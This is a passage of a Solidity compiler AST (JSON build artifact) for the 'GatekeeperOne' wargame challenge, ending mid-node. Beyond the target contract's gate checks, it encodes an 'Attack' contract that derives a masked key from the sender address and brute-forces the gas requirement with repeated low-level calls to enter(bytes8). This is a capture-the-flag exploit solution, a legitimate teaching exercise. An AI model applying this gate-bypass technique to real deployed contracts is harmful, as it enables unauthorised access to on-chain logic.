																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "847:24:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint32",
																	"typeString": "uint32"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 421,
																		"name": "_gateKey",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 390,
																		"src": "882:8:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes8",
																			"typeString": "bytes8"
																		}
																	],
																	"id": 420,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "875:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint64_$",
																		"typeString": "type(uint64)"
																	},
																	"typeName": {
																		"id": 419,
																		"name": "uint64",
																		"nodeType": "ElementaryTypeName",
																		"src": "875:6:1",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 422,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "875:16:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															},
															"src": "847:44:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "476174656b65657065724f6e653a20696e76616c69642067617465546872656520706172742074776f",
															"id": 424,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "893:43:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_39fe204b27a3e3ed4d75f8d47c15461cce98adfa1823a4a7fd67c936eb0c84da",
																"typeString": "literal_string \"GatekeeperOne: invalid gateThree part two\""
															},
															"value": "GatekeeperOne: invalid gateThree part two"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_39fe204b27a3e3ed4d75f8d47c15461cce98adfa1823a4a7fd67c936eb0c84da",
																"typeString": "literal_string \"GatekeeperOne: invalid gateThree part two\""
															}
														],
														"id": 411,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "839:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 425,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "839:98:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 426,
												"nodeType": "ExpressionStatement",
												"src": "839:98:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint32",
																"typeString": "uint32"
															},
															"id": 440,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 432,
																				"name": "_gateKey",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 390,
																				"src": "1045:8:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes8",
																					"typeString": "bytes8"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes8",
																					"typeString": "bytes8"
																				}
																			],
																			"id": 431,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "1038:6:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_uint64_$",
																				"typeString": "type(uint64)"
																			},
																			"typeName": {
																				"id": 430,
																				"name": "uint64",
																				"nodeType": "ElementaryTypeName",
																				"src": "1038:6:1",
																				"typeDescriptions": {
																					"typeIdentifier": null,
																					"typeString": null
																				}
																			}
																		},
																		"id": 433,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1038:16:1",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint64",
																			"typeString": "uint64"
																		}
																	],
																	"id": 429,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "1031:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint32_$",
																		"typeString": "type(uint32)"
																	},
																	"typeName": {
																		"id": 428,
																		"name": "uint32",
																		"nodeType": "ElementaryTypeName",
																		"src": "1031:6:1",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 434,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1031:24:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint32",
																	"typeString": "uint32"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 437,
																			"name": "tx",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": -26,
																			"src": "1066:2:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_transaction",
																				"typeString": "tx"
																			}
																		},
																		"id": 438,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "origin",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "1066:9:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	],
																	"id": 436,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "1059:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint16_$",
																		"typeString": "type(uint16)"
																	},
																	"typeName": {
																		"id": 435,
																		"name": "uint16",
																		"nodeType": "ElementaryTypeName",
																		"src": "1059:6:1",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 439,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1059:17:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint16",
																	"typeString": "uint16"
																}
															},
															"src": "1031:45:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "476174656b65657065724f6e653a20696e76616c6964206761746554687265652070617274207468726565",
															"id": 441,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1078:45:1",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_bfa38229ea3879f03173764f8f4bd3e16aa5bbdfac4aba032e756684dab5eb09",
																"typeString": "literal_string \"GatekeeperOne: invalid gateThree part three\""
															},
															"value": "GatekeeperOne: invalid gateThree part three"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_bfa38229ea3879f03173764f8f4bd3e16aa5bbdfac4aba032e756684dab5eb09",
																"typeString": "literal_string \"GatekeeperOne: invalid gateThree part three\""
															}
														],
														"id": 427,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "1023:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 442,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1023:101:1",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 443,
												"nodeType": "ExpressionStatement",
												"src": "1023:101:1"
											},
											{
												"id": 444,
												"nodeType": "PlaceholderStatement",
												"src": "1130:1:1"
											}
										]
									},
									"documentation": null,
									"id": 446,
									"name": "gateThree",
									"nodeType": "ModifierDefinition",
									"overrides": null,
									"parameters": {
										"id": 391,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 390,
												"mutability": "mutable",
												"name": "_gateKey",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 446,
												"src": "548:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes8",
													"typeString": "bytes8"
												},
												"typeName": {
													"id": 389,
													"name": "bytes8",
													"nodeType": "ElementaryTypeName",
													"src": "548:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "547:17:1"
									},
									"src": "529:607:1",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 467,
										"nodeType": "Block",
										"src": "1230:47:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 463,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 460,
														"name": "entrant",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 362,
														"src": "1236:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address",
															"typeString": "address"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 461,
															"name": "tx",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": -26,
															"src": "1246:2:1",
															"typeDescriptions": {
																"typeIdentifier": "t_magic_transaction",
																"typeString": "tx"
															}
														},
														"id": 462,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "origin",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "1246:9:1",
														"typeDescriptions": {
															"typeIdentifier": "t_address_payable",
															"typeString": "address payable"
														}
													},
													"src": "1236:19:1",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"id": 464,
												"nodeType": "ExpressionStatement",
												"src": "1236:19:1"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 465,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "1268:4:1",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 459,
												"id": 466,
												"nodeType": "Return",
												"src": "1261:11:1"
											}
										]
									},
									"documentation": null,
									"functionSelector": "3370204e",
									"id": 468,
									"implemented": true,
									"kind": "function",
									"modifiers": [
										{
											"arguments": null,
											"id": 451,
											"modifierName": {
												"argumentTypes": null,
												"id": 450,
												"name": "gateOne",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 374,
												"src": "1179:7:1",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "1179:7:1"
										},
										{
											"arguments": null,
											"id": 453,
											"modifierName": {
												"argumentTypes": null,
												"id": 452,
												"name": "gateTwo",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 388,
												"src": "1187:7:1",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$__$",
													"typeString": "modifier ()"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "1187:7:1"
										},
										{
											"arguments": [
												{
													"argumentTypes": null,
													"id": 455,
													"name": "_gateKey",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 448,
													"src": "1205:8:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												}
											],
											"id": 456,
											"modifierName": {
												"argumentTypes": null,
												"id": 454,
												"name": "gateThree",
												"nodeType": "Identifier",
												"overloadedDeclarations": [],
												"referencedDeclaration": 446,
												"src": "1195:9:1",
												"typeDescriptions": {
													"typeIdentifier": "t_modifier$_t_bytes8_$",
													"typeString": "modifier (bytes8)"
												}
											},
											"nodeType": "ModifierInvocation",
											"src": "1195:19:1"
										}
									],
									"name": "enter",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 449,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 448,
												"mutability": "mutable",
												"name": "_gateKey",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 468,
												"src": "1155:15:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bytes8",
													"typeString": "bytes8"
												},
												"typeName": {
													"id": 447,
													"name": "bytes8",
													"nodeType": "ElementaryTypeName",
													"src": "1155:6:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1154:17:1"
									},
									"returnParameters": {
										"id": 459,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 458,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 468,
												"src": "1224:4:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 457,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "1224:4:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1223:6:1"
									},
									"scope": 469,
									"src": "1140:137:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 537,
							"src": "117:1162:1"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 536,
							"linearizedBaseContracts": [
								536
							],
							"name": "Attack",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 471,
									"mutability": "mutable",
									"name": "keeper",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 536,
									"src": "1302:20:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_GatekeeperOne_$469",
										"typeString": "contract GatekeeperOne"
									},
									"typeName": {
										"contractScope": null,
										"id": 470,
										"name": "GatekeeperOne",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 469,
										"src": "1302:13:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_GatekeeperOne_$469",
											"typeString": "contract GatekeeperOne"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 480,
										"nodeType": "Block",
										"src": "1369:32:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 478,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 476,
														"name": "keeper",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 471,
														"src": "1379:6:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_GatekeeperOne_$469",
															"typeString": "contract GatekeeperOne"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 477,
														"name": "_keeper",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 473,
														"src": "1387:7:1",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_GatekeeperOne_$469",
															"typeString": "contract GatekeeperOne"
														}
													},
													"src": "1379:15:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_GatekeeperOne_$469",
														"typeString": "contract GatekeeperOne"
													}
												},
												"id": 479,
												"nodeType": "ExpressionStatement",
												"src": "1379:15:1"
											}
										]
									},
									"documentation": null,
									"id": 481,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 474,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 473,
												"mutability": "mutable",
												"name": "_keeper",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 481,
												"src": "1340:21:1",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_contract$_GatekeeperOne_$469",
													"typeString": "contract GatekeeperOne"
												},
												"typeName": {
													"contractScope": null,
													"id": 472,
													"name": "GatekeeperOne",
													"nodeType": "UserDefinedTypeName",
													"referencedDeclaration": 469,
													"src": "1340:13:1",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_GatekeeperOne_$469",
														"typeString": "contract GatekeeperOne"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1339:23:1"
									},
									"returnParameters": {
										"id": 475,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1369:0:1"
									},
									"scope": 536,
									"src": "1328:73:1",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 534,
										"nodeType": "Block",
										"src": "1440:324:1",
										"statements": [
											{
												"assignments": [
													485
												],
												"declarations": [
													{
														"constant": false,
														"id": 485,
														"mutability": "mutable",
														"name": "key",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 534,
														"src": "1450:10:1",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes8",
															"typeString": "bytes8"
														},
														"typeName": {
															"id": 484,
															"name": "bytes8",
															"nodeType": "ElementaryTypeName",
															"src": "1450:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes8",
																"typeString": "bytes8"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 496,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													},
													"id": 495,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 490,
																			"name": "msg",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": -15,
																			"src": "1477:3:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_message",
																				"typeString": "msg"
																			}
																		},
																		"id": 491,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "sender",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "1477:10:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_address_payable",
																			"typeString": "address payable"
																		}
																	],
																	"id": 489,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "1470:6:1",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint64_$",
																		"typeString": "type(uint64)"
																	},
																	"typeName": {
																		"id": 488,
																		"name": "uint64",
																		"nodeType": "ElementaryTypeName",
																		"src": "1470:6:1",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 492,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1470:18:1",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint64",
																	"typeString": "uint64"
																}
															],
															"id": 487,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"lValueRequested": false,
															"nodeType": "ElementaryTypeNameExpression",
															"src": "1463:6:1",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_bytes8_$",
																"typeString": "type(bytes8)"
															},
															"typeName": {
																"id": 486,
																"name": "bytes8",
																"nodeType": "ElementaryTypeName",
																"src": "1463:6:1",
																"typeDescriptions": {
																	"typeIdentifier": null,
																	"typeString": null
																}
															}
														},
														"id": 493,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1463:26:1",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_bytes8",
															"typeString": "bytes8"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "&",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "307846464646464646463030303046464646",
														"id": 494,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "1491:18:1",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_18446744069414649855_by_1",
															"typeString": "int_const 18446744069414649855"
														},
														"value": "0xFFFFFFFF0000FFFF"
													},
													"src": "1463:46:1",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes8",
														"typeString": "bytes8"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1450:59:1"
											},
											{
												"body": {
													"id": 532,
													"nodeType": "Block",
													"src": "1553:196:1",
													"statements": [
														{
															"assignments": [
																508,
																null
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 508,
																	"mutability": "mutable",
																	"name": "success",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 532,
																	"src": "1568:12:1",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	"typeName": {
																		"id": 507,
																		"name": "bool",
																		"nodeType": "ElementaryTypeName",
																		"src": "1568:4:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bool",
																			"typeString": "bool"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																},
																null
															],
															"id": 527,
															"initialValue": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "656e7465722862797465733829",
																				"id": 523,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "string",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1652:15:1",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_stringliteral_3370204ec98aba7f6a7e6f8e1821e3e93ed448423cd937e26bb3635897d85768",
																					"typeString": "literal_string \"enter(bytes8)\""
																				},
																				"value": "enter(bytes8)"
																			},
																			{
																				"argumentTypes": null,
																				"id": 524,
																				"name": "key",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 485,
																				"src": "1669:3:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes8",
																					"typeString": "bytes8"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_stringliteral_3370204ec98aba7f6a7e6f8e1821e3e93ed448423cd937e26bb3635897d85768",
																					"typeString": "literal_string \"enter(bytes8)\""
																				},
																				{
																					"typeIdentifier": "t_bytes8",
																					"typeString": "bytes8"
																				}
																			],
																			"expression": {
																				"argumentTypes": null,
																				"id": 521,
																				"name": "abi",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": -1,
																				"src": "1628:3:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_magic_abi",
																					"typeString": "abi"
																				}
																			},
																			"id": 522,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"memberName": "encodeWithSignature",
																			"nodeType": "MemberAccess",
																			"referencedDeclaration": null,
																			"src": "1628:23:1",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_abiencodewithsignature_pure$_t_string_memory_ptr_$returns$_t_bytes_memory_ptr_$",
																				"typeString": "function (string memory) pure returns (bytes memory)"
																			}
																		},
																		"id": 525,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1628:45:1",
																		"tryCall": false,
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_bytes_memory_ptr",
																				"typeString": "bytes memory"
																			}
																		],
																		"expression": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 511,
																					"name": "keeper",
																					"nodeType": "Identifier",
																					"overloadedDeclarations": [],
																					"referencedDeclaration": 471,
																					"src": "1594:6:1",
																					"typeDescriptions": {
																						"typeIdentifier": "t_contract$_GatekeeperOne_$469",
																						"typeString": "contract GatekeeperOne"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_contract$_GatekeeperOne_$469",
																						"typeString": "contract GatekeeperOne"
																					}
																				],
																				"id": 510,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "1586:7:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_address_$",
																					"typeString": "type(address)"
																				},
																				"typeName": {
																					"id": 509,
																					"name": "address",
																					"nodeType": "ElementaryTypeName",
																					"src": "1586:7:1",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 512,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "1586:15:1",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_address",
																				"typeString": "address"
																			}
																		},
																		"id": 513,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "call",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "1586:20:1",
																		"typeDescriptions": {
																			"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																			"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
																		}
																	},
																	"id": 520,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"names": [
																		"gas"
																	],
																	"nodeType": "FunctionCallOptions",
																	"options": [
																		{
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 519,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 514,
																				"name": "i",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 498,
																				"src": "1612:1:1",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "+",
																			"rightExpression": {
																				"argumentTypes": null,
																				"components": [
																					{
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_rational_24573_by_1",
																							"typeString": "int_const 24573"
																						},
																						"id": 517,
																						"isConstant": false,
